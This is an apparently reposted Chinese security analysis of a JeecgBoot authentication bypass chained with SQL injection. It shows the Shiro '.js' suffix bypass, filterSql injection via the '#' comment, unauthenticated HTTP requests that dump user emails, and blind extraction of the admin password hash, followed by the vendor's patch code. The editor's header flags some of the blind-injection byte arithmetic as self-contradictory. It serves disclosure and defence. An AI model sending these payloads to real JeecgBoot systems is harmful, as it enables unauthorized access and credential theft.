---
source: "https://xz.aliyun.com/news/92753"
product: "JeecgBoot/Shiro后缀放行及字典SQL过滤"
record_type: "analysis"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "JeecgBoot 未授权权限绕过 + SQL 注入组合漏洞分析与复现"
prerequisites: "来源所述条件，未列明部分仍待核：声称<=3.9.3，实验main c63277e与v3.9.2/7df07a8；v3.9.5/e3b9dc0于2026-08-26修复，需上游确认"
side_effects: "未执行；本文需注意的操作影响：盲注字符数/字节数说明自相矛盾；LENGTH(password)=16且0x6362表示两个ASCII字符，却称16十六进制字符=8字节、循环共8字节可恢复16字符；需区分数据库字符串与解码后的摘要"
source_url: "https://xz.aliyun.com/news/92753"
source_status: "recorded"
id: "vw-6b5f8d54b71f7e2f9936736e"
entity_id: "ve-6b5f8d54b71f7e2f9936736e"
schema_version: "1"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：声称&lt;=3.9.3，实验main c63277e与v3.9.2/7df07a8；v3.9.5/e3b9dc0于2026-08-26修复，需上游确认

代码与实验材料：包含Shiro/MyBatis链、真/假对照和补丁源码；无脚本不算缺陷，但请求编码和签名重现说明不足

来源证据范围：先知news/92753及长亭具体条目、官方repo；提交只短SHA无直接patch链接

- **结论使用边界（1）**：盲注字符数/字节数说明自相矛盾；依据：LENGTH(password)=16且0x6362表示两个ASCII字符，却称16十六进制字符=8字节、循环共8字节可恢复16字符；需区分数据库字符串与解码后的摘要。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

- **事实待核（2）**：示例请求缺正确传输与签名说明；依据：原始URI含空格AND和#.js；浏览器中的#会成为fragment；X-Sign仅称dictCode的md5，缺实际规范化/时间戳/密钥算法或固定签名适用性。该项尚不能从转载本身确定外部事实；下文相应编号、版本或修复说法只作为来源记录，不能据此判定部署受影响或已修复。明确更正另列于本节。

- **事实待核（3）**：证据范围与修复说明应收敛；依据：HTTP200对401仅说明路由放行，需业务响应证明访问；未展示isLiteral实现却断言其拒绝hex字面量；&lt;=所有旧版超出两提交实验。该项尚不能从转载本身确定外部事实；下文相应编号、版本或修复说法只作为来源记录，不能据此判定部署受影响或已修复。明确更正另列于本节。

- **来源与引用处置（4）**：重复叙述与章节编号；依据：2.1重复讲两次匹配表；3.3标题第三步却缺第二步；引用2.4节实际不存在。保留这部分来源材料并与技术结论分开；其引用或宣传内容不能补足本文漏洞的证据。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# JeecgBoot 未授权权限绕过 + SQL 注入组合漏洞分析与复现
> 来源：https://xz.aliyun.com/news/92753

## 一、漏洞概述

  
JeecgBoot 是一款基于 Spring Boot / MyBatis-Plus 构建的开源低代码开发平台，提供表单设计、报表、流程、大屏等在线开发能力，在企业级业务快速构建场景中被广泛使用，默认部署于 `/jeecg-boot` 上下文。  
  
近期在奇安信CERT和长亭CT Stack中发现，JeecgBoot（≤ 3.9.3）存在未授权权限绕过 + SQL 注入组合漏洞。未认证的远程攻击者可通过构造特制请求绕过 JWT 认证，匿名访问 `/sys/dict/getDictItems/*` 等敏感数据接口，并利用参数过滤缺陷注入恶意 SQL，通过布尔盲注窃取数据库中的敏感信息（用户账号、口令哈希、手机号、业务数据等）。然后官方在官方发版的 v3.9.5 中已修复权限绕过并对 filterSql 注入做了加固。  
  

| 项目 | 内容 |
| --- | --- |
| 漏洞类型 | 权限绕过（认证缺陷）+ SQL 注入 |
| 影响版本 | JeecgBoot ≤ 3.9.3（含官方 tag v3.9.2、main 分支 3.9.3） |
| 认证要求 | 无（未认证可利用） |
| 利用方式 | 布尔盲注（数据窃取） |
| 修复状态 | v3.9.5 已修复权限绕过，filterSql 注入已加固 |

  

## 二、漏洞原理

  
漏洞由2个独立缺陷组合而成，叠加后形成完整攻击链。  
  

### 2.1 Shiro 路由匹配差异 —— 权限绕过

  
JeecgBoot 使用 Apache Shiro 做认证，`ShiroConfig` 中配置了大量静态资源放行规则：  
  

```java
// ShiroConfig.java
filterChainDefinitionMap.put("/**/*.js", "anon");
filterChainDefinitionMap.put("/**/*.css", "anon");
filterChainDefinitionMap.put("/**/*.png", "anon");
filterChainDefinitionMap.put("/**/*.html", "anon");
// ...
filterChainDefinitionMap.put("/**", "jwt");
```

代码分析 —— Shiro 过滤器链（Filter Chain）：  
  
Shiro 通过 `PathMatchingFilterChainResolver` 对请求 URL 做 `AntPathMatcher` 通配匹配。`/**/*.js` 这类规则的本质是「路径任意深度 + 结尾 `.js`」即匿名放行。而 Spring MVC 的 路径参数`@PathVariable` 接口（如 `@RequestMapping("/getDictItems/{dictCode}")`）对 URL 尾段的 `.js` 无感知，因为它是路径参数传参会把它并入 `{dictCode}` 参数。  
  
Shiro和Spring两类匹配器语义差异对比：  
  

| 匹配器 | 对 /sys/dict/getDictItems/sys_user,realname,id.js 的判定 |
| --- | --- |
| Shiro AntPathMatcher | 命中 /**/*.js → anon 放行（JwtFilter 不执行） |
| Spring HandlerMapping | 命中 /getDictItems/{dictCode} → dictCode="sys_user,realname,id.js" 传入控制器 |

  
这个「放行与路由」之间的落差，就是权限绕过的根因。且由于 `id.js` 是字典码的一部分，后续 SQL 解析仍可执行（配合第 2.4 节的 `#` 注释消化掉 `.js`）。  
  
Shiro 的 `AntPathMatcher` 对 URL 做通配符匹配，而 Spring MVC 对 URL 做控制器映射。二者对同一个 URL 的解析差异构成了绕过面：  
  
● 攻击者在 `/sys/dict/getDictItems/{dictCode}` 这类 `@PathVariable` 接口的 URL 末尾追加 `.js`，例如：  

```
/sys/dict/getDictItems/sys_user,realname,id.js
```

  
● Shiro 层：URL 命中 `/**/*.js` 的 `anon` 规则 → JwtFilter 完全不执行；  
● Spring 层：`/sys/dict/getDictItems/{dictCode}` 仍能匹配，`.js` 被当作 `dictCode` 的一部分传入。  
结果：该接口无需任何 Token，匿名直达控制器。  
  

### 2.2 filterSql 拼接 —— SQL 注入

  
`SysDictController.getDictItems` 接收路径参数 `dictCode`，四段式格式 `table,text,code,filterSql`，服务端按逗号拆分：  
  

```java
// SysDictServiceImpl.getDictItems
String[] params = dictCode.split(",");
if (params.length == 4) {
    ls = this.queryTableDictItemsByCodeAndFilter(params[0], params[1], params[2], params[3]);
    //                                                        table     text     code       filterSql
}
```

最终在 MyBatis mapper 中 `filterSql` 被 `${}` 直接拼接：  
  

```xml
<!-- SysDictMapper.xml -->
<select id="queryTableDictWithFilter" resultType="org.jeecg.common.system.vo.DictModel">
    select ${text} as "text", ${code} as "value" from ${table}
    <if test="filterSql != null and filterSql != ''">
        where ${filterSql}
    </if>
</select>
```

实际执行 SQL：  
  

```sql
SELECT ${text} AS "text", ${code} AS "value" FROM ${table} WHERE ${filterSql}
```

代码分析 —— MyBatis `${}` 拼接 + 参数拆分：  
  
注入点在两个层面：  
  
1 控制器层（`SysDictController.getDictItems`）接收路径参数 `dictCode`，`SysDictServiceImpl.getDictItems` 按 `,` 拆分为 4 段，第 4 段 `params[3]` 直接作为 `filterSql` 传入；  
2 Mapper 层（`SysDictMapper.xml`）将 `${filterSql}` 原样拼进 `WHERE`，`${table}`、`${text}`、`${code}` 同样拼接（三者虽经过 `getSqlInjectTableName/getSqlInjectField` 的合法字符校验，但 `filterSql` 没有任何白名单约束，仅过一套可绕过的黑名单）。  
虽然存在字典专用 SQL 黑名单（`specialDictSqlXssStr`），但黑名单不包含 `#`、`or` 等关键字，且 `filterSql` 直接进 WHERE 子句，注入空间充足。字典专用黑名单源码如下：  
  

```java
// SqlInjectionUtil.java —— 字典专用 SQL 黑名单
private static String specialDictSqlXssStr =
    "exec |peformance_schema|information_schema|extractvalue|updatexml|geohash|"
    + "gtid_subset|gtid_subtract|insert |select |delete |update |drop |count |chr "
    + "|mid |master |truncate |char |declare |;|+|--|substring |substring(";
```

可以看到黑名单覆盖了 `select/insert/update/drop/mid/char` 等关键字，但完全没有覆盖 `#`（MySQL 行注释）与 `or`（逻辑运算符），二者均可直接用于注入构造。  
  

### 2.3 组合成链

  
1 路径加 `.js` → 绕过 Shiro JWT（命中静态资源 anon 规则）；  
2 四段式 dictCode → `filterSql` 注入 WHERE 子句；  
3 `#` 注释吞掉尾随 `.js` → 注入 payload 生效。  
由于 `.js` 已并入 `dictCode` 的最后一个路径段，若直接执行会变成 `WHERE id=1.js` 这类非法 SQL。在 filterSql 末尾追加 `#`（MySQL 行注释），`.js` 被当作注释内容吞掉，实际生效的 SQL 是 `WHERE <payload>`。  
  

## 三、漏洞复现

  

### 3.1 实验环境

  

| 组件 | 版本 |
| --- | --- |
| JeecgBoot | 3.9.3（官方 main，commit c63277e 源码构建） |
| 运行方式 | Docker Compose（MySQL 8.0 / Redis / 后端） |
| 操作系统 | Ubuntu 22.04 |
| 目标地址 | http://192.168.170.128:8080/jeecg-boot |

  

### 3.2 第一步：权限绕过验证

  

```
GET /jeecg-boot/sys/dict/getDictItems/sys_user,realname,id      → HTTP 401（JWT拦截）
```



  
  

```
GET /jeecg-boot/sys/dict/getDictItems/sys_user,realname,id.js   → HTTP 200（匿名放行）
```



  
  
同一接口，仅因 URL 末尾 `.js` 的有无，返回 200 / 401，权限绕过成立。  
  

### 3.3 第三步：布尔盲注确认注入点

  
条件为真 → 返回数据行；条件为假 → 返回空集。对应的 HTTP 请求（未携带任何认证 Token）：  
  
条件为真（1=1）→ 返回所有用户数据  
  

```http
GET /jeecg-boot/sys/dict/getDictItems/sys_user,realname,id,1=1#.js HTTP/1.1
Host: 192.168.170.128:8080
X-Sign:      E442B046AAAA557FE5FA8C2408B10413
X-Timestamp: <当前毫秒时间戳>
```

```json
{"code":0,"result":[{"text":"测试用户","value":"..."},{"text":"张三","value":"..."}, ...]}
```



  
  
条件为假（1=2）→ 返回空集  
  

```http
GET /jeecg-boot/sys/dict/getDictItems/sys_user,realname,id,1=2#.js HTTP/1.1
Host: 192.168.170.128:8080
X-Sign:      65B318EFA2CB5257F3FF891B50B27F85
X-Timestamp: <当前毫秒时间戳>
```

```json
{"code":0,"result":[]}
```



  
  
布尔差分成立，证明 SQL 注入确认可利用。  
  

### 3.4 第四步：敏感信息窃取

  
非黑名单字段整列明文获取（无需盲注，直接把目标字段放 `text` 位）：  
  

```http
GET /jeecg-boot/sys/dict/getDictItems/sys_user,email,id,1=1#.js HTTP/1.1
Host: 192.168.170.128:8080
X-Sign:      B1C42DE43E279D2E69009C6648B3D0B2
X-Timestamp: <当前毫秒时间戳>
```

```json
{"code":0,"result":[{"text":"111@1.com","value":"..."},{"text":"418799587@qq.com","value":"..."},{"text":"jeecg@163.com","value":"..."}, ...]}
```



  
  



  
  
黑名单字段（如 password）布尔盲注提取：先用 `LENGTH()` 二分定长，再用十六进制字面量前缀比较（`password>=0x<prefix>`）逐字节二分，避开被拦截的 `MID/SUBSTRING/LEFT/ORD` 等函数：  
  
盲注原理：以"返回行与否"作为布尔 oracle（`result` 非空 = 条件成立，空集 = 不成立）。`password` 以 16 个十六进制字符存储（= 8 字节），先二分定长度，再对每个字节（2 个 hex 字符）用 `password>=0x<前缀+候选>` 做字典序二分，0x00~0xFF 折半收敛出该字节值，逐字节拼出完整哈希。  
  
LENGTH 二分定长  
  
二分过程：在 `1~256` 区间折半试探（先 `>=128`、再 `>=64`...逐步逼近），最终判定 `LENGTH(password)=16`：  
  

```http
GET /jeecg-boot/sys/dict/getDictItems/sys_user,realname,id,id='e9ca23d68d884d4ebb19d07889727dae' AND LENGTH(password)>=16#.js HTTP/1.1
Host: 192.168.170.128:8080
X-Sign:      <对 dictCode 的 md5 签名>
X-Timestamp: <当前毫秒时间戳>
```

```json
{"code":0,"result":[{"text":"管理员","value":"e9ca23d68d884d4ebb19d07889727dae"}]}   → True（条件成立，返回行）
```

逐字节提取（password>=0x<hex前缀> 二分）  
  
`0x6362` = 字节 `'cb'`（即 password 前两个字符），表示已确定前 2 字节为 `cb`，继续二分下一个字节。  
  

```http
GET /jeecg-boot/sys/dict/getDictItems/sys_user,realname,id,id='e9ca23d68d884d4ebb19d07889727dae' AND password>=0x6362#.js HTTP/1.1
Host: 192.168.170.128:8080
X-Sign:      <对 dictCode 的 md5 签名>
X-Timestamp: <当前毫秒时间戳>
```

```json
{"code":0,"result":[{"text":"管理员","value":"e9ca23d68d884d4ebb19d07889727dae"}]}   → True（该字节前缀成立）
```

`>=` 判定原理：MySQL 对字节串做字典序比较，`password >= 0x<前缀+候选>` 为真即说明目标字节 ≥ 候选值，从而 0x00~0xFF 二分收敛。逐字节推进（共 8 字节），拼出完整哈希：  
  

```latex
admin.password = cb362cfeefbf3d8d（与数据库直接查询一致）
```

实际落库的 SQL 语句：  
  

```sql
SELECT realname AS "text", id AS "value"
FROM sys_user
WHERE id='e9ca23d68d884d4ebb19d07889727dae' AND password>=0x6362
-- #.js 被 MySQL 注释吞掉
```

脚本这里就不用给出了，现在AI很强大直接能出结果。  
  

## 四、影响范围

  
●受影响的软件版本：JeecgBoot ≤ 3.9.3  
  
○ 官方最新 tag：v3.9.2（commit `7df07a8`）  
○ 官方 main 分支：3.9.3（commit `c63277e`）  
● 修复状态（v3.9.5，commit `e3b9dc0`，2026-08-26 发布）：  
修复代码 —— ShiroConfig.java：  
  

```java
//update-begin---author:scott ---date:2026-08-24  for：【issues/9840】静态资源按目录放行，避免业务接口通过伪造文件后缀绕过JWT-----------
private static final String[] ANONYMOUS_STATIC_RESOURCE_PATHS = {
    // 基础入口
    "/", "/index.html", "/doc.html", "/favicon.ico", "/logo.png", "/pca.json", "/demo1.html",
    // Vue3前端构建资源
    "/manifest.webmanifest", "/sw.js", "/workbox-*.js", "/assets/**", "/resource/**",
    "/static/**", "/css/**", "/js/**", "/img/**", "/fonts/**",
    // 系统内置静态页面
    "/generic/**", "/view/userlist.html",
    // 开源Demo大屏模板
    "/bigscreen/template1/**", "/bigscreen/template2/**",
    // 积木报表
    "/jmreport/desreport_/**",
    // 积木BI仪表盘、大屏
    "/drag/favicon.ico", "/drag/lib/**", "/drag/list/**",
    // Chat2BI
    "/chat2bi/**", "/jimu/chat2bi/css/**", "/jimu/chat2bi/js/**","/jimu/chat2bi/libs/**", "/jimu/chat2bi/logo.png"
};
//update-end---author:scott ---date:2026-08-24  for：【issues/9840】静态资源按目录放行，避免业务接口通过伪造文件后缀绕过JWT-----------
```

核心：删除 `/**/*.js`、`/**/*.css`、`/**/*.png` 等全局后缀匿名放行，改为按目录精确放行（`/static/**`、`/js/**` 等），`/sys/dict/getDictItems/xxx.js` 不再命中 any anon 规则 → 走 JWT 校验。  
  
修复代码 —— SqlInjectionUtil.java（新增调用）：  
  

```java
public static void filterDictConditionSqlFromRequest(String table, String value) {
    if (value == null || "".equals(value)) {
        return;
    }
    String trimmed = value.trim();
    if (trimmed.isEmpty()) {
        return;
    }
    Set<String> conditionFields;
    try {
        // 1. 用 jsqlparser 解析条件 SQL，做结构化白名单校验
        conditionFields = DictSqlConditionCheckUtil.checkAndGetFields(trimmed);
    } catch (Exception e) {
        log.error(SqlInjectionUtil.SQL_INJECTION_TIP_VARIABLE, value);
        throw new JeecgSqlInjectionException(SqlInjectionUtil.SQL_INJECTION_TIP + value);
    }
    // 2. 校验条件中引用的字段，禁止访问敏感表字段
    SensitiveTableCheckUtil.checkForbiddenFields(table, conditionFields.toArray(new String[0]));
}
```

修复代码 —— DictSqlConditionCheckUtil.java（结构化白名单核心）：  
  

```java
public static Set<String> checkAndGetFields(String value) {
    if (value == null || value.trim().isEmpty()) {
        return Set.of();
    }
    String trimmed = value.trim();
    Set<String> conditionFields = new LinkedHashSet<>();
    try {
        if (containsSqlComment(trimmed)) {                    // ① 禁止 SQL 注释（#、--）
            throw new IllegalArgumentException("字典过滤条件不允许包含SQL注释");
        }
        int orderByIndex = findTopLevelOrderBy(trimmed);
        String conditionSql = orderByIndex < 0 ? trimmed : trimmed.substring(0, orderByIndex).trim();
        String orderBySql = orderByIndex < 0 ? null
                : trimmed.substring(orderByIndex).replaceFirst("(?i)^order\\s+by\\s+", "").trim();
        if ((!conditionSql.isEmpty() && !validateCondition(conditionSql, conditionFields))
                || (orderBySql != null && !validateOrderBy(orderBySql, conditionFields))) {
            throw new IllegalArgumentException("不支持的字典过滤条件");
        }
        return conditionFields;
    } catch (Exception e) {
        throw new IllegalArgumentException("不支持的字典过滤条件", e);
    }
}

// 表达式仅允许：列 + 比较运算符 + 字面量（右操作数必须是字面量，左操作数必须是列）
private static boolean validateExpression(Expression expression, Set<String> conditionFields) {
    if (expression instanceof ParenthesedExpressionList<?> expressionList) {
        return expressionList.size() == 1 && validateExpression(expressionList.get(0), conditionFields);
    }
    if (expression instanceof AndExpression || expression instanceof OrExpression) {
        BinaryExpression logicalExpression = (BinaryExpression) expression;
        return validateExpression(logicalExpression.getLeftExpression(), conditionFields)
                && validateExpression(logicalExpression.getRightExpression(), conditionFields);
    }
    if (isComparisonExpression(expression)) {
        BinaryExpression comparison = (BinaryExpression) expression;
        return addConditionField(comparison.getLeftExpression(), conditionFields)
                && isLiteral(comparison.getRightExpression());
    }
    return false;
}
```

核心：用 jsqlparser 将 filterSql 解析为表达式树，只放行「列 = 比较符 = 字面量」；`containsSqlComment` 拦截 `#`/`--` 注释，`addConditionField` 拒绝函数调用（如 `LENGTH(password)`）与子查询，`isLiteral` 拒绝十六进制字面量（如 `password>=0x6362`）。  
  
○ 已修复权限绕过：静态资源改为按目录放行（`ANONYMOUS_STATIC_RESOURCE_PATHS`），移除 `/**/*.js` 等全局后缀放行，`.js` 伪造后缀不再绕过 JWT。  
○ filterSql 注入已加固：新增 `DictSqlConditionCheckUtil` 结构化白名单校验（jsqlparser 解析，禁注释、禁函数/子查询），普通列+字面量比较仍可用。  
○升级到 v3.9.5，并保留 WAF 层二次过滤。  
  

## Reference

  
●[https://github.com/jeecgboot/JeecgBoot](https://github.com/jeecgboot/JeecgBoot)  
  
●[https://stack.chaitin.com/vuldb/detail/0b9b9789-525c-4527-8f46-52ca2b62414c](https://stack.chaitin.com/vuldb/detail/0b9b9789-525c-4527-8f46-52ca2b62414c)


---

> 来源：Mr-xn/Penetration_Testing_POC
